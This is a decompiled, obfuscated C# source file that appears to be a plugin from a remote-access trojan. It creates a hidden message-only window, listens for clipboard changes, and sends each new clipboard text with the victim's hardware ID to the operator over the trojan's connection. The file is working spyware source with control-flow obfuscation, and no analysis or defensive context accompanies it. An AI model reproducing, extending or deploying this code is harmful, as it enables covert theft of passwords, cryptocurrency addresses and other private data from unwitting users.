using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using HsZcU78F13T1yLWI1V;
using MessagePackLib.MessagePack;
using UY3BiEArlp6B4GPt9k;

namespace Plugin;

public class ClipboardNotification : Form
{
	private static IntPtr HWND_MESSAGE;

	private static ClipboardNotification MYblplHYUwPM43IBbc;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public ClipboardNotification()
	{
		eU81HnbgBQ03NEnspQ();
		base._002Ector();
		int num = 0;
		if (true)
		{
			num = 1;
		}
		while (true)
		{
			switch (num)
			{
			default:
				return;
			case 2:
				AddClipboardFormatListener(uoXPLizI4kN3j7lYFH(this, OPWAL0Q5W1E6DTD97A.thB5MKJbx));
				num = 0;
				if (1 == 0)
				{
					num = 0;
				}
				break;
			case 1:
				SetParent(uoXPLizI4kN3j7lYFH(this, OPWAL0Q5W1E6DTD97A.thB5MKJbx), HWND_MESSAGE);
				num = 2;
				break;
			case 0:
				return;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void WndProc(ref Message m)
	{
		int num = 3;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 1:
					return;
				case 3:
					if (Kj3ITZjmbv0LEUAYjf.edv36NoIr(ref m, Kj3ITZjmbv0LEUAYjf.QebCinWHO) == 797)
					{
						num2 = 2;
						if (k7p7T0x2ieaS1dZOYk())
						{
							continue;
						}
						break;
					}
					goto default;
				case 2:
				{
					MsgPack msgPack = new MsgPack();
					CnGJbNyyBJa2U597LXs(k3NEnPysF0q5j3dFlil(msgPack, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(0)), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(32));
					CnGJbNyyBJa2U597LXs(k3NEnPysF0q5j3dFlil(msgPack, uQhvA4yd8RJ3nYubHQU(68)), Connection.Hwid);
					CnGJbNyyBJa2U597LXs(k3NEnPysF0q5j3dFlil(msgPack, uQhvA4yd8RJ3nYubHQU(80)), iQlQ5fyIBWoVyeGKwt8(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(90), Clipboard.GetCurrentText(), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(134), ArgSUFncog3IDpIWFj.kujz9EokA));
					Le6MoCyVMrg4kRpotFa(msgPack.Encode2Bytes());
					num2 = 0;
					if (k7p7T0x2ieaS1dZOYk())
					{
						continue;
					}
					break;
				}
				default:
					Gdrfm63Zu1lYm7nIlnf.edv36NoIr(this, ref m, Gdrfm63Zu1lYm7nIlnf.puR330E9r0);
					num2 = 1;
					if (G0CTiDq0f1fIvsnCrd() == null)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool AddClipboardFormatListener(IntPtr hwnd);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	[MethodImpl(MethodImplOptions.NoInlining)]
	static ClipboardNotification()
	{
		int num = 2;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 2:
					eU81HnbgBQ03NEnspQ();
					num2 = 1;
					if (true)
					{
						continue;
					}
					break;
				case 0:
					return;
				case 1:
					HWND_MESSAGE = new IntPtr(-3);
					num2 = 0;
					if (true)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void eU81HnbgBQ03NEnspQ()
	{
		WkMgYHbfSUMGdoITRx.gIGiY8hzeM6TJ();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr uoXPLizI4kN3j7lYFH(object P_0, object P_1)
	{
		return OPWAL0Q5W1E6DTD97A.edv36NoIr(P_0, (OPWAL0Q5W1E6DTD97A)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool k7p7T0x2ieaS1dZOYk()
	{
		return MYblplHYUwPM43IBbc == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static ClipboardNotification G0CTiDq0f1fIvsnCrd()
	{
		return MYblplHYUwPM43IBbc;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object k3NEnPysF0q5j3dFlil(object P_0, object P_1)
	{
		return ((MsgPack)P_0).ForcePathObject((string)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void CnGJbNyyBJa2U597LXs(object P_0, object P_1)
	{
		((MsgPack)P_0).AsString = (string)P_1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object uQhvA4yd8RJ3nYubHQU(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object iQlQ5fyIBWoVyeGKwt8(object P_0, object P_1, object P_2, object P_3)
	{
		return ArgSUFncog3IDpIWFj.edv36NoIr((string)P_0, (string)P_1, (string)P_2, (ArgSUFncog3IDpIWFj)P_3);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void Le6MoCyVMrg4kRpotFa(object P_0)
	{
		Connection.Send((byte[])P_0);
	}
}
